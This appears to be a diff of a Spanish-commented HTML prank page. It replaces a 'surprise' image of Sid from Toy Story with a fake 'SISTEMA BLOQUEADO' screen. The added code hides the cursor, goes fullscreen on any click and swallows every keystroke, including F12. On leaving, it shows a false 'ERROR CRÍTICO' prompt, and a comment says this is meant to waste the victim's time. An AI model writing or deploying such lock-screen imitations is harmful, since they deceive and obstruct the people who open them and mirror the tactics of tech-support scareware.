@@ -3,16 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>¡Sorpresa!</title>
+    <title>SISTEMA BLOQUEADO</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: black; display: flex; justify-content: center; align-items: center; }
-        img { width: 100vw; height: 100vh; object-fit: contain; }
+        body, html { 
+            margin: 0; padding: 0; height: 100%; width: 100%; 
+            overflow: hidden; background-color: black; 
+            display: flex; justify-content: center; align-items: center;
+            cursor: none; /* Esconde el ratón para que parezca bloqueado */
+        }
+        img { width: 100%; height: 100%; object-fit: contain; }
     </style>
 </head>
-<body>
-    <img src="https://static.wikia.nocookie.net/disney/images/d/d4/Sid_Phillips_Transparent.png" alt="Sid">
+<body onclick="entrarPantallaCompleta()">
+
+    <img src="https://upload.wikimedia.org/wikipedia/en/d/d8/Sid_Toy_Story.png" alt="Sid">
+
     <script>
-        window.onbeforeunload = function() { return "¡No te vayas!"; };
+        // Al hacer clic en cualquier parte, se pone en pantalla completa
+        function entrarPantallaCompleta() {
+            var el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        }
+
+        // Bloqueo de teclado (evita F12 y otras teclas comunes)
+        document.onkeydown = function (e) {
+            return false;
+        };
+
+        // El mensaje de "No puedes salir" que le hará perder tiempo
+        window.onbeforeunload = function() {
+            return "ERROR CRÍTICO: El sistema no responde. ¿Deseas forzar el cierre?";
+        };
     </script>
 </body>
 </html>
